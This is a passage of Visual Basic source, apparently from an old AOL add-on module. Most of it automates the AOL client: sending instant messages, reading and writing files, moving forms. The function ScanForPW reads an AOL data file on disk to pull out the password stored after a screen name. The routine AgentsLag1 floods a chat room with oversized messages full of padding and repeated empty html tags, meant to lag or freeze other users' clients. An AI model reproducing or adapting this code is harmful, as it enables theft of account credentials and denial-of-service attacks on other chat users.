            FullWindow& = FindWindow("#32770", "America Online")
            FullButton& = FindWindowEx(FullWindow&, 0&, "Button", "OK")
        Loop Until FullWindow& = 0& And FullButton& = 0&
    End If
    DoEvents
End Sub
Sub IM_Send(SN, Msg)
Dim AOL As Long, MDI As Long, Buddy As Long, IMWin As Long
Dim icon As Long, Edit As Long, RichTXT As Long, Button As Long
Dim OK As Long, L As Long, X As Long
AOL& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
Buddy& = FindWindowEx(MDI&, 0&, vbNullString, "Buddy List Window")
If Buddy& = 0 Then
    Call Keyword("BuddyView")
    Do: DoEvents
    Loop Until Buddy& <> 0
End If
icon& = FindWindowEx(Buddy&, 0&, "_AOL_Icon", vbNullString)
For L = 1 To 2
    icon& = GetWindow(icon&, 2)
Next L
Timeout (0.01)
Click (icon&)
Do: DoEvents
IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "Send Instant Message")
    Edit& = FindWindowEx(IMWin&, 0&, "_AOL_Edit", vbNullString)
        RichTXT& = FindWindowEx(IMWin&, 0&, "RICHCNTL", vbNullString)
            Button& = FindWindowEx(IMWin&, 0&, "_AOL_Icon", vbNullString)
Loop Until Edit& <> 0 And RichTXT& <> 0 And Button& <> 0
    Call SendMEssageByString(Edit&, WM_SETTEXT, 0, SN)
    Call SendMEssageByString(RichTXT&, WM_SETTEXT, 0, Msg)
For X = 1 To 9
    Button& = GetWindow(Button&, 2)
Next X
Timeout (0.01)
Click (Button&)
Do: DoEvents
AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
        IMWin& = FindWindowEx(MDI&, 0&, vbNullString, "Send Instant Message")
            OK& = FindWindow("#32770", "America Online")
If OK& <> 0 Then Call SendMessage(OK&, WM_CLOSE, 0, 0)
                 Call SendMessage(IMWin&, WM_CLOSE, 0, 0)
Exit Do
If IMWin& = 0 Then Exit Do
Loop
End Sub
Function ReplaceText(Text, Find, Changeto)
Dim X As Long, char As String, chars As String
If InStr(Text, Find) = 0 Then
    ReplaceText = Text
Exit Function
End If
    For X = 1 To Len(Text)
    char$ = Mid(Text, X, 1)
    chars$ = chars$ & char$
If char$ = Find Then
chars$ = Mid(chars$, 1, Len(chars$) - 1) + Changeto
End If
Next X
ReplaceText = chars$
End Function
Function ScanForPW(SName As String, AolPath As String) As String
Static FBuff As String * 40000, NBuff As String * 20
Dim Fblen As Long, Fbchnk As Long, StrFound As Integer
Dim sPath As String, X As Long, NChar As Long, NXChar As Long
sPath$ = AolPath$
Open sPath$ For Binary As #1
Fbchnk& = LOF(1)
Fblen& = 1
Do: DoEvents
FBuff = String$(40000, Chr$(0))
Get #1, Fblen&, FBuff
If InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(0)) Or InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(32)) Then
    StrFound = InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(0))
    If StrFound = 0 Then
        StrFound = InStrB(UCase$(FBuff), UCase$(SName$) & Chr$(32))
    End If
    NBuff = String$(20, Chr$(0))
    Get #1, Fblen& + (StrFound - 1), NBuff
End If
If (Fblen& + 40000) > Fbchnk& And Fblen& <> Fbchnk& Then
    Fblen& = Fblen& + (Fbchnk& - Fblen&)
Else
    Fblen& = Fblen& + 40000
End If
Loop Until Fblen& > Fbchnk&
Close #1

For X = 1 To Len(NBuff)
    NChar = InStr(Mid$(NBuff, X, 1), Chr(0))
    If NChar <> 0 Then
        NXChar = X - NChar
    End If
Next X
ScanForPW$ = Left(NBuff, Len(NBuff) - (Len(NBuff) - NXChar))
End Function



Sub Form_Move(Frm As Form)
DoEvents
ReleaseCapture
ReturnVal% = SendMessage(Frm.hwnd, &HA1, 2, 0)
End Sub
Sub SetChildFocus(child)
setchild% = SetFocusAPI(child)
End Sub

Function FileInput(FileName As String)
free = FreeFile
Open FileName For Input As free
    i = FileLen(FileName)
    X = Input(i, free)
Close free
    FileInput = X
End Function
Function FileInput2(FileName As String)
free = FreeFile
Open FileName For Input As free
    i = FileLen(FileName)
    X = Input(i - 2, free)
Close free
    FileInput2 = X
End Function
Function FileLoadList(FileName As String, Lis As ListBox)
On Error Resume Next
Open FileName For Input As #1
Do While Not EOF(1)
 Line Input #1, Ln$
Lis.AddItem Ln$
Loop
Close #1
End Function
Function FileSaveList(FileName As String, Lis As ListBox)
free = FreeFile
Open FileName For Output As free
For X = 0 To Lis.ListCount
Print #1, Lis.List(X)
Next X
Close #1
End Function
Function LoadTimes(FileName)
        free = FreeFile
    Open FileName For Random As free
    Close free
    Open FileName For Input As free
i = FileLen(FileName)
X = Input(i, free)
    Close free

    Open FileName For Output As #1
X = Val(X) + 1
    Print #1, X
    Close #1
        LoadTimes = X
End Function
Function Wait(HLong)
'Same as timeout
Current = Timer
Do While Timer - Current < Val(HLong)
DoEvents
Loop
End Function
Sub AgentsLag1()
SendChat "<b><b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im}"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
Pause (1)
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im} </html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html>"
Pause 1
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im} </html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
Pause 1
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im}"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
Pause 1
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im}"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
Pause 1
End Sub
Sub ChangeCaption(HWD%, newcaption As String)
Call AOLSetText(HWD%, newcaption)
End Sub
